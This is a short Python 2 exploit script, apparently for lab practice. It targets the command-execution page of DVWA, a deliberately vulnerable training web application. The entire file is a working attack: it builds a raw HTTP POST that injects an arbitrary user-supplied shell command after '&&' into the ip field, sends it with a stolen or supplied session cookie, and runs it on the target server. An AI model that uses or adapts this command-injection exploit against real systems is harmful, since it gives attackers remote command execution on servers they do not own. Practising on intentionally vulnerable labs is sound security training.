#!/usr/bin/python
#This Exploit is for low level command execution on DVWA(Damn Vulnrable Web Application)

import socket
import time
import urllib
import sys

if len(sys.argv) == 4:
    pass
else:
    print "Usage: [Target-IP] [PHPSESSID] [COMMAND]"
    sys.exit()

target = sys.argv[1]
cookie = sys.argv[2]
print "[?] Generating url encodings..."
time.sleep(0.3)
data = sys.argv[3]
command = urllib.pathname2url(data)

payload = """
POST /vulnerabilities/exec/index.php HTTP/1.1
Host: """ + target + """
Content-Length: 147
Cache-Control: max-age=0
Origin: http://""" + target + """
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.168 Safari/537.36 OPR/51.0.2830.40
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: http://""" + target + """/vulnerabilities/exec/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en
Cookie: PHPSESSID=""" + cookie + """; security=low
Connection: close

ip=google.nl+%26%26+"""+ command +"""&submit=submit
"""

print "[*] Binding connection..."
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target, 80))
print "[?] Sending Exploit..."
sock.send(payload)
print "String: %s" % (command)
time.sleep(2)
print "[*] Sent..."
sock.close()
